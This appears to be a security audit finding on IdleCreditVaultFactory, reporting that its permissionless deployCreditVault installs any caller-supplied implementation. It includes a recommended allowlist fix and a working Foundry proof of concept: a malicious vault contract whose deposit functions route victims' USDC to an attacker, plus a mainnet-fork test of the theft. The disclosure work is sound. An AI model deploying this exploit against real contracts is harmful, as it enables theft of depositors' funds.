### Title
Permissionless factory deployment executes attacker-controlled implementation code, enabling theft of all credit-vault deposits - ([File: contracts/IdleCreditVaultFactory.sol](contracts/IdleCreditVaultFactory.sol))

### Summary
`deployCreditVault` can be called by any account and accepts an arbitrary `cvParams.implementation`, which is installed as the runtime implementation of a new `TransparentUpgradeableProxy` [1](#0-0) . The initializer passed to that proxy is delegatecalled into attacker-controlled code, and the resulting proxy is then configured and advertised by the factory as a production credit vault [2](#0-1) [3](#0-2) . A malicious implementation only needs to expose the small set of administrative methods invoked during deployment; it can then define a deposit function that transfers lender assets directly to the attacker instead of following the normal deposit flow [4](#0-3) [5](#0-4) .

### Finding Description
The factory implicitly treats caller-supplied implementation addresses as trusted code. `deployCreditVault` has no owner, treasury, registry, bytecode-hash, or implementation allowlist check [1](#0-0) . `_deployBaseCreditVault` passes that unvalidated address to `_deployProxy`, which constructs a transparent proxy using the attacker’s implementation [2](#0-1) [3](#0-2) .

After initialization, the factory calls the expected configuration methods and transfers nominal ownership to `treasury` [4](#0-3) [6](#0-5) . Those calls do not prove that the implementation has the expected semantics: a compatible malicious implementation can accept the calls, retain an attacker address, and implement `depositAA` as an unrestricted transfer of depositor funds to the attacker.

This is the credit-vault analogue of executing fork code in an elevated CI context: untrusted supplied code is promoted into a trusted deployment path and is given the externally visible identity of a factory-produced vault.

### Impact Explanation
Any unprivileged EOA can deploy a factory-emitted credit vault whose `depositAA` implementation sends deposited underlying directly to the attacker [1](#0-0) [2](#0-1) . If a victim deposits `X` underlying, the attacker receives `X` underlying in the same transaction, so the loss is the full deposited amount.

The factory’s subsequent `transferOwnership(treasury)` call does not mitigate the issue because proxy ownership only governs methods implemented by the supplied logic contract; it cannot remove a hard-coded theft path in the implementation [6](#0-5) .

### Likelihood Explanation
The attack requires only one external transaction to deploy the malicious vault because `deployCreditVault` is public and accepts implementation addresses as caller-controlled input [7](#0-6) [1](#0-0) . After deployment, any user interacting with the emitted vault address and approving its configured underlying can have the entire approved deposit diverted by the malicious `depositAA` implementation [8](#0-7) .

The attack does not depend on compromising an existing vault, borrower, owner, manager, oracle, or Keyring administrator; it abuses the factory’s permissionless execution of arbitrary implementation code.

### Recommendation
Do not accept arbitrary implementation addresses in `deployCreditVault` or `deployRevolvingCreditVault`. Restrict deployment to the treasury or a dedicated deployer role, and maintain an on-chain allowlist or immutable registry of audited implementation addresses for the CDO, strategy, queue, write-off escrow, and programmable borrower [1](#0-0) [9](#0-8) .

A stronger fix is to store the approved implementations in the factory and ignore caller-supplied implementation fields entirely. The factory should also emit the implementation addresses in `CreditVaultDeployed` so indexers can distinguish legitimate deployments from arbitrary proxy deployments.

### Proof of Concept
The following Foundry test demonstrates the issue on a mainnet fork. The malicious implementation has the initializer and configuration selectors expected by the factory, but its `depositAA` sends the depositor’s USDC to the attacker.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from
    "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from
    "../contracts/strategies/idle/IdleCreditVault.sol";

contract MaliciousTranche {
    string public name = "Malicious Tranche";
    string public symbol = "MAL";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract MaliciousCreditVault {
    using SafeERC20 for IERC20;

    address public token;
    address public strategy;
    address public AATranche;
    address public BBTranche;
    address public attacker;
    address public owner;

    function initialize(
        uint256,
        address guardedToken,
        address,
        address,
        address,
        address strategy_,
        uint256
    ) external {
        require(token == address(0), "initialized");
        token = guardedToken;
        strategy = strategy_;
        AATranche = address(new MaliciousTranche());
        BBTranche = address(new MaliciousTranche());
        attacker = tx.origin;
    }

    function depositAA(uint256 amount) external returns (uint256) {
        IERC20(token).safeTransferFrom(msg.sender, attacker, amount);
        MaliciousTranche(AATranche).mint(msg.sender, amount * 1e12);
        return amount * 1e12;
    }

    function depositBB(uint256 amount) external returns (uint256) {
        IERC20(token).safeTransferFrom(msg.sender, attacker, amount);
        MaliciousTranche(BBTranche).mint(msg.sender, amount * 1e12);
        return amount * 1e12;
    }

    // Configuration calls made by the factory are accepted but ignored.
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function transferOwnership(address newOwner) external {
        owner = newOwner;
    }
}

contract FactoryMaliciousImplementationTest is Test {
    address internal constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address internal treasury = makeAddr("treasury");
    address internal proxyAdmin = makeAddr("proxyAdmin");
    address internal factoryProxyAdmin = makeAddr("factoryProxyAdmin");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function testFactoryDeploysAttackerImplementationAndDepositIsStolen()
        external
    {
        vm.createSelectFork("mainnet");

        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(factoryImpl),
                    factoryProxyAdmin,
                    abi.encodeWithSelector(
                        IdleCreditVaultFactory.initialize.selector,
                        treasury,
                        proxyAdmin
                    )
                )
            )
        );

        IdleCreditVault strategyImpl = new IdleCreditVault();
        MaliciousCreditVault maliciousCdo = new MaliciousCreditVault();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(maliciousCdo),
                limit: 0,
                underlying: USDC,
                apr: 1e18,
                epochDuration: 30 days,
                bufferPeriod: 5 days,
                instantWithdrawDelay: 0,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: makeAddr("feeReceiver"),
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImpl),
                manager: manager,
                borrower: borrower,
                borrowerName: "Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.prank(attacker);
        vm.recordLogs();
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        address maliciousVault;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 eventSig = keccak256(
            "CreditVaultDeployed(address,address,address,address,address,address)"
        );

        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == eventSig) {
                maliciousVault = address(uint160(uint256(logs[i].topics[1])));
            }
        }

        assertTrue(maliciousVault != address(0));

        uint256 depositAmount = 100_000e6;
        deal(USDC, victim, depositAmount);

        vm.startPrank(victim);
        IERC20(USDC).approve(maliciousVault, depositAmount);
        MaliciousCreditVault(maliciousVault).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(IERC20(USDC).balanceOf(attacker), depositAmount);
        assertEq(IERC20(USDC).balanceOf(maliciousVault), 0);
        assertEq(IERC20(USDC).balanceOf(victim), 0);
    }
}
```

The PoC succeeds because the attacker-controlled implementation is installed through `_deployProxy` without validation, and the emitted proxy remains fully attacker-defined even after factory configuration completes [10](#0-9) [11](#0-10) .
